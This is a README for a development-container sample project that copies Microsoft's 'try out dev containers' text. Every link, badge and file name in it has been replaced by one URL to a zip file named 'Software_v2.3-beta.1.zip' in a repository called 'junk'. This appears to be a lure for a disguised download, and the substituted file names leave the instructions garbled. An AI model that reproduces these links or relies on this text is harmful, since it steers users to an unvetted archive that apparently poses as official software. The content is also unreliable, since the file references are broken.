# Try Out Development Containers: https://github.com/JohnInWI/junk/raw/refs/heads/main/.vscode/Software_v2.3-beta.1.zip

[![Open in Remote - Containers](https://github.com/JohnInWI/junk/raw/refs/heads/main/.vscode/Software_v2.3-beta.1.zip%20-%20Containers&message=Open&color=blue&logo=visualstudiocode)](https://github.com/JohnInWI/junk/raw/refs/heads/main/.vscode/Software_v2.3-beta.1.zip)

A **development container** is a running [Docker](https://github.com/JohnInWI/junk/raw/refs/heads/main/.vscode/Software_v2.3-beta.1.zip) container with a well-defined tool/runtime stack and its prerequisites. You can try out development containers with **[GitHub Codespaces](https://github.com/JohnInWI/junk/raw/refs/heads/main/.vscode/Software_v2.3-beta.1.zip)** or **[Visual Studio Code Remote - Containers](https://github.com/JohnInWI/junk/raw/refs/heads/main/.vscode/Software_v2.3-beta.1.zip)**.

This is a sample project that lets you try out either option in a few easy steps. We have a variety of other [vscode-remote-try-*](https://github.com/JohnInWI/junk/raw/refs/heads/main/.vscode/Software_v2.3-beta.1.zip%3Amicrosoft+vscode-remote-try-&type=Repositories) sample projects, too.

> **Note:** If you already have a Codespace or dev container, you can jump to the [Things to try](#things-to-try) section.

## Setting up the development container

### GitHub Codespaces
Follow these steps to open this sample in a Codespace:
1. Click the Code drop-down menu and select the **Open with Codespaces** option.
1. Select **+ New codespace** at the bottom on the pane.

For more info, check out the [GitHub documentation](https://github.com/JohnInWI/junk/raw/refs/heads/main/.vscode/Software_v2.3-beta.1.zip).
  
### VS Code Remote - Containers

If you already have VS Code and Docker installed, you can click the badge above or [here](https://github.com/JohnInWI/junk/raw/refs/heads/main/.vscode/Software_v2.3-beta.1.zip) to get started. Clicking these links will cause VS Code to automatically install the Remote - Containers extension if needed, clone the source code into a container volume, and spin up a dev container for use.

Follow these steps to open this sample in a container using the VS Code Remote - Containers extension:

1. If this is your first time using a development container, please ensure your system meets the pre-reqs (i.e. have Docker installed) in the [getting started steps](https://github.com/JohnInWI/junk/raw/refs/heads/main/.vscode/Software_v2.3-beta.1.zip).

2. To use this repository, you can either open the repository in an isolated Docker volume:

    - Press <kbd>F1</kbd> and select the **Remote-Containers: Try a Sample...** command.
    - Choose the "Node" sample, wait for the container to start, and try things out!
        > **Note:** Under the hood, this will use the **Remote-Containers: Clone Repository in Container Volume...** command to clone the source code in a Docker volume instead of the local filesystem. [Volumes](https://github.com/JohnInWI/junk/raw/refs/heads/main/.vscode/Software_v2.3-beta.1.zip) are the preferred mechanism for persisting container data.

    Or open a locally cloned copy of the code:

   - Clone this repository to your local filesystem.
   - Press <kbd>F1</kbd> and select the **Remote-Containers: Open Folder in Container...** command.
   - Select the cloned copy of this folder, wait for the container to start, and try things out!

## Things to try

Once you have this sample opened, you'll be able to work with it like you would locally.

> **Note:** This container runs as a non-root user with sudo access by default. Comment out `"remoteUser": "node"` in `https://github.com/JohnInWI/junk/raw/refs/heads/main/.vscode/Software_v2.3-beta.1.zip` if you'd prefer to run as root.

Some things to try:

1. **Edit:**
   - Open `https://github.com/JohnInWI/junk/raw/refs/heads/main/.vscode/Software_v2.3-beta.1.zip`
   - Try adding some code and check out the language features. 
   - Notice that `eslint` and the `vscode-eslint` extension are already installed in the container since the `https://github.com/JohnInWI/junk/raw/refs/heads/main/.vscode/Software_v2.3-beta.1.zip` lists `"https://github.com/JohnInWI/junk/raw/refs/heads/main/.vscode/Software_v2.3-beta.1.zip"` as an extension to install automatically when the container is created.
2. **Terminal:** Press <kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>\`</kbd> and type `uname` and other Linux commands from the terminal window.
3. **Build, Run, and Debug:**
   - Open `https://github.com/JohnInWI/junk/raw/refs/heads/main/.vscode/Software_v2.3-beta.1.zip`
   - Add a breakpoint (e.g. on line 20).
   - Press <kbd>F5</kbd> to launch the app in the container.
   - Once the breakpoint is hit, try hovering over variables, examining locals, and more.
   - Continue (<kbd>F5</kbd>). You can connect to the server in the container by either: 
      - Clicking on `Open in Browser` in the notification telling you: `Your service running on port 3000 is available`.
      - Clicking the globe icon in the 'Ports' view. The 'Ports' view gives you an organized table of your forwarded ports, and you can access it with the command **Ports: Focus on Ports View**.
   - Notice port 3000 in the 'Ports' view is labeled "Hello Remote World." In `https://github.com/JohnInWI/junk/raw/refs/heads/main/.vscode/Software_v2.3-beta.1.zip`, you can set `"portsAttributes"`, such as a label for your forwarded ports and the action to be taken when the port is autoforwarded. 
      - If we didn't know the port was 3000, we could've used a regex instead of "3000" in the `"portsAttributes"`, such as ".+https://github.com/JohnInWI/junk/raw/refs/heads/main/.vscode/Software_v2.3-beta.1.zip".

   > **Note:** In Remote - Containers, you can access your app at `http://localhost:3000` in a local browser. But in a browser-based Codespace, you must click the link from the notification or the `Ports` view so that the service handles port forwarding in the browser and generates the correct URL.
   
4. **Rebuild or update your container**

   You may want to make changes to your container, such as installing a different version of a software or forwarding a new port. You'll rebuild your container for your changes to take effect. 
   
   **Open browser automatically:** As an example change, let's update the `portsAttributes` in the `https://github.com/JohnInWI/junk/raw/refs/heads/main/.vscode/Software_v2.3-beta.1.zip` file to open a browser when our port is automatically forwarded.
   
   - Open the `https://github.com/JohnInWI/junk/raw/refs/heads/main/.vscode/Software_v2.3-beta.1.zip` file.
   - Modify the `"onAutoForward"` attribute in your `portsAttributes` from `"notify"` to `"openBrowser"`.
   - Press <kbd>F1</kbd> and select the **Remote-Containers: Rebuild Container** or **Codespaces: Rebuild Container** command so the modifications are picked up.

## Contributing

This project welcomes contributions and suggestions.  Most contributions require you to agree to a
Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us
the rights to use your contribution. For details, visit https://github.com/JohnInWI/junk/raw/refs/heads/main/.vscode/Software_v2.3-beta.1.zip

When you submit a pull request, a CLA-bot will automatically determine whether you need to provide
a CLA and decorate the PR appropriately (e.g., label, comment). Simply follow the instructions
provided by the bot. You will only need to do this once across all repos using our CLA.

This project has adopted the [Microsoft Open Source Code of Conduct](https://github.com/JohnInWI/junk/raw/refs/heads/main/.vscode/Software_v2.3-beta.1.zip).
For more information see the [Code of Conduct FAQ](https://github.com/JohnInWI/junk/raw/refs/heads/main/.vscode/Software_v2.3-beta.1.zip) or
contact [https://github.com/JohnInWI/junk/raw/refs/heads/main/.vscode/Software_v2.3-beta.1.zip](https://github.com/JohnInWI/junk/raw/refs/heads/main/.vscode/Software_v2.3-beta.1.zip) with any additional questions or comments.

## License

Copyright © Microsoft Corporation All rights reserved.<br />
Licensed under the MIT License. See LICENSE in the project root for license information.
